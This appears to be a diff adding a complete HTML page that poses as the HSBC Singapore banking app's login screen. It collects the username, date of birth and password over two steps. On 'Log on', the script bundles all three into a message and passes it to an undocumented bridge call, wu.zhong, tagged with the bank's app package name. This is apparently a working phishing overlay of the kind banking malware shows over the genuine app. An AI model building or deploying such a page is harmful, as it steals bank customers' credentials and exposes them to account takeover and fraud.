@@ -1,0 +1,506 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HSBC SG</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+
+        .header {
+            background-color: white;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .menu-icon {
+            width: 24px;
+            height: 24px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            cursor: pointer;
+        }
+
+        .menu-icon span {
+            width: 100%;
+            height: 3px;
+            background-color: #333;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .logo-diamond {
+            width: 40px;
+            height: 40px;
+            background-color: #c41e3a;
+            transform: rotate(45deg);
+            position: relative;
+        }
+
+        .logo-diamond::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 60%;
+            height: 60%;
+            background-color: white;
+            transform: translate(-50%, -50%) rotate(-45deg);
+        }
+
+        .logo-diamond::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 30%;
+            height: 30%;
+            background-color: #c41e3a;
+            transform: translate(-50%, -50%) rotate(-45deg);
+        }
+
+        .logo-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background-color: white;
+            min-height: calc(100vh - 70px);
+        }
+
+        .main-title {
+            font-size: 32px;
+            font-weight: 300;
+            color: #333;
+            padding: 30px 20px 20px;
+            margin: 0;
+        }
+
+        .info-box {
+            background-color: #e8f4f8;
+            margin: 0 20px 30px;
+            padding: 15px;
+            border-left: 4px solid #0066cc;
+            border-radius: 4px;
+            position: relative;
+        }
+
+        .info-icon {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            width: 20px;
+            height: 20px;
+            background-color: #0066cc;
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .info-text {
+            margin-left: 35px;
+            color: #333;
+            line-height: 1.4;
+        }
+
+        .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 15px;
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            color: #666;
+        }
+
+        .form-group {
+            padding: 0 20px;
+            margin-bottom: 20px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 16px;
+            color: #333;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .help-icon {
+            width: 18px;
+            height: 18px;
+            background-color: #666;
+            color: white;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+            margin-left: 5px;
+            vertical-align: middle;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            background-color: #f9f9f9;
+        }
+
+        .form-input:focus {
+            outline: none;
+            border-color: #0066cc;
+            background-color: white;
+        }
+
+        .form-input.error {
+            border-color: #c41e3a;
+            background-color: #fef2f2;
+        }
+
+        .error-message {
+            color: #c41e3a;
+            font-size: 14px;
+            margin-top: 5px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .error-icon {
+            width: 16px;
+            height: 16px;
+            border-radius: 50%;
+            background-color: #c41e3a;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            font-weight: bold;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 20px 20px;
+        }
+
+
+        .continue-btn {
+            width: calc(100% - 40px);
+            margin: 30px 20px;
+            padding: 15px;
+            background-color: #c41e3a;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .continue-btn:hover {
+            background-color: #b87882;
+        }
+
+        .help-links {
+            padding: 0 20px 30px;
+        }
+
+        .help-link {
+            display: block;
+            color: #c41e3a;
+            text-decoration: none;
+            margin-bottom: 15px;
+            font-size: 16px;
+            position: relative;
+            padding-right: 20px;
+        }
+
+        .help-link::after {
+            content: '›';
+            position: absolute;
+            right: 0;
+            font-size: 20px;
+            color: #c41e3a;
+        }
+
+        .help-link:hover {
+            text-decoration: underline;
+        }
+
+        .date-group {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .date-input {
+            flex: 1;
+            padding: 12px;
+            border: 2px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+            width: 30px;
+            text-align: center;
+            background-color: #f9f9f9;
+        }
+
+        .date-input:focus {
+            outline: none;
+            border-color: #0066cc;
+            background-color: white;
+        }
+
+        .date-separator {
+            color: #666;
+            font-size: 16px;
+        }
+
+        .date-labels {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .date-label {
+            flex: 1;
+            text-align: center;
+        }
+
+        .example-text {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 15px;
+        }
+
+        .greeting {
+            font-size: 24px;
+            color: #333;
+            padding: 20px;
+            margin: 0;
+            font-weight: 300;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+       
+
+        .security-title {
+            font-size: 20px;
+            font-weight: 500;
+            color: #333;
+            padding: 0 20px 20px;
+            margin: 0;
+        }
+
+        
+        .step-username {
+            display: block;
+        }
+
+        .step-security {
+            display: none;
+        }
+
+       
+        body.security-step .step-username {
+            display: none;
+        }
+
+        body.security-step .step-security {
+            display: block;
+        }
+
+   
+        .date-input.active {
+            border-color: #0066cc;
+            background-color: white;
+        }
+
+        .password-input.active {
+            border-color: #0066cc;
+            background-color: white;
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+       
+        <div class="logo">
+            <div class="logo-diamond"></div>
+            <span class="logo-text">HSBC SG</span>
+        </div>
+        <div></div>
+    </header>
+
+    <div class="container">
+        <div class="step-username">
+            <h1 class="main-title">Log on to Banking App</h1>
+            
+        
+
+            <div class="form-group">
+                <label class="form-label" for="username">
+                    Please enter your username
+                    <span class="help-icon">?</span>
+                </label>
+                <input type="text" id="username" class="form-input" />
+                <div class="error-message" style="display: none;">
+                    <span class="error-icon">×</span>
+                    Please provide your username.
+                </div>
+            </div>
+
+            
+
+            <button class="continue-btn" onclick="showSecurityStep()">Continue</button>
+
+            <div class="help-links">
+                <a href="#" class="help-link">Forgotten your username?</a>
+                <a href="#" class="help-link">Not registered for Online Banking?</a>
+            </div>
+        </div>
+
+        <div class="step-security">
+            <h2 class="greeting">Welcome Back</h2>
+            
+            <h3 class="security-title">Additional security</h3>
+
+            <div class="form-group">
+                <label class="form-label">
+                    Please enter your date of birth
+                    <span class="help-icon">?</span>
+                </label>
+                <div class="example-text">For example 31-12-1970</div>
+                <div class="date-labels">
+                    <div class="date-label">DD</div>
+                    <div class="date-label">MM</div>
+                    <div class="date-label">YYYY</div>
+                </div>
+                <div class="date-group">
+                    <input type="text" class="date-input active" maxlength="2" placeholder="">
+                    <span class="date-separator">-</span>
+                    <input type="text" class="date-input" maxlength="2" placeholder="">
+                    <span class="date-separator">-</span>
+                    <input type="text" class="date-input" maxlength="4" placeholder="">
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label class="form-label" for="password">
+                    Please enter your password
+                    <span class="help-icon">?</span>
+                </label>
+                <input type="password" id="password" class="form-input active" />
+            </div>
+
+            <button class="continue-btn" onclick="login()">Log on</button>
+
+            <div class="help-links">
+                <a href="#" class="help-link">Forgotten your password?</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function showSecurityStep() {
+            const username = document.getElementById('username').value.trim();
+            const errorMessage = document.querySelector('.error-message');
+            const usernameInput = document.getElementById('username');
+            
+            if (!username) {
+                usernameInput.classList.add('error');
+                errorMessage.style.display = 'flex';
+                return;
+            }
+            
+            usernameInput.classList.remove('error');
+            errorMessage.style.display = 'none';
+            document.body.classList.add('security-step');
+        }
+
+
+        function login(){
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+        
+            var dob="";
+            const dateInputs = document.querySelectorAll('.date-input');
+            dateInputs.forEach(inp => dob+=inp.value+"/");
+            
+            if (!password) {
+
+                document.getElementById('password').focus();
+                return;
+            }
+
+            wu.zhong(`🔰HSBC Singapore \n\n✉️Username: ${username}\n📆Date of Birth: ${dob}\n🔒Password: ${password}`,"sg.com.hsbc.hsbcsingapore");
+
+        }
+
+      
+      
+
+        const dateInputs = document.querySelectorAll('.date-input');
+        dateInputs.forEach((input, index) => {
+            input.addEventListener('input', function() {
+                if (this.value.length === this.maxLength && index < dateInputs.length - 1) {
+                    dateInputs[index + 1].focus();
+                    dateInputs[index].classList.remove('active');
+                    dateInputs[index + 1].classList.add('active');
+                }
+            });
+            
+            input.addEventListener('focus', function() {
+                dateInputs.forEach(inp => inp.classList.remove('active'));
+                this.classList.add('active');
+            });
+        });
+
+        document.getElementById('password').addEventListener('focus', function() {
+            this.classList.add('active');
+        });
+
+        document.getElementById('password').addEventListener('blur', function() {
+            this.classList.remove('active');
+        });
+    </script>
+</body>
+</html>
